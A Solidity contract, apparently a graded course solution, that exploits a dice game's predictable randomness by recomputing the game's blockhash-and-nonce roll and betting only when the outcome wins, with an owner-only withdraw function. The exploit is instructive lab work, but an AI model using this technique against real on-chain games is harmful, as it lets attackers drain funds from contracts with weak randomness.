pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    //////////////////////
    /// State Variables //
    //////////////////////
    
    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////
    
    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    receive() external payable {}

    function riggedRoll() external {
        uint256 rollPrice = 0.002 ether;
        uint256 balance = address(this).balance;
        if (balance < rollPrice) revert NotEnoughETH(rollPrice, balance);
        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        if (roll > 5) revert NotWinningRoll(roll);
        diceGame.rollTheDice{value: rollPrice}();
    }

    function withdraw(address payable _addr, uint256 _amount) external onlyOwner {
        uint256 balance = address(this).balance;
        if (_amount > balance) revert InsufficientBalance(_amount, balance);
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
